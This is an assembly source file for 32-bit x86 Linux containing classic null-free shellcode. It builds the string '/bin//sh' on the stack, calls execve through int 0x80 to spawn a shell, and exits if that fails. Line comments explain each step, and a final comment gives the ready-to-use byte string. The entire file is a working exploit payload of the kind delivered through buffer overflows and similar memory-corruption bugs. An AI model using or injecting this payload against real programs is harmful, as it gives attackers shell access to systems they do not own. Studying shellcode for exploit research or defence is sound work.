; nasm -f elf32 shell.asm
; ld -m elf_i386 -o shell shell.o

section .text
    global _start

_start:
    ; clear registers to avoid garbage values or null bytes
    xor eax, eax        ; Set EAX to 0
    push eax            ; Push string-terminating NULL onto the stack

    push 0x68732f2f     ; "//sh"
    push 0x6e69622f     ; "/bin"

    mov ebx, esp        ; EBX: Pointer to pathname string "/bin//sh"
    
    push eax            ; Push NULL to terminate the argv array
    push ebx            ; Push pointer to "/bin//sh" as argv[0]
    mov ecx, esp        ; ECX: pointer to argv array [pointer_to_string, NULL]
    
    xor edx, edx        ; EDX: NULL pointer for envp (no environment variables)

    ; execute the system call
    mov al, 11          ; EAX: syscall number 11 is sys_execve
    int 0x80            ; trigger kernel interrupt to run the shell

    ; fallback exit system call (only runs if execve fails)
    xor eax, eax
    inc eax             ; EAX = 1 (sys_exit)
    xor ebx, ebx        ; EBX = 0 (exit code)
    int 0x80

; \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80
